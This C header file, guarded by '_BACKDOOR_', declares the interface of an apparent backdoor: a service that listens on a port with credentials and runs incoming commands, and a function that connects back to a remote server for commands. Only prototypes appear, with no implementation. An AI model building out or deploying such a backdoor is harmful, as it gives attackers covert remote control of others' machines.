#ifndef _BACKDOOR_
#define _BACKDOOR_

#ifdef __cplusplus
extern "C" {
#endif

// Status codes for backdoor operations
enum {
    BD_SUCCESS = 0,  // Operation successful
    BD_FAIL = -1     // Operation failed
};

// Start a service that listens for incoming connections and processes commands
int start_service(char *usr, char *pwd, unsigned short listenPort);
// Connect back to a remote server and process commands
int conn_back_to_server(char *servIP, unsigned short servPort);

#ifdef __cplusplus
}
#endif

#endif //_BACKDOOR_
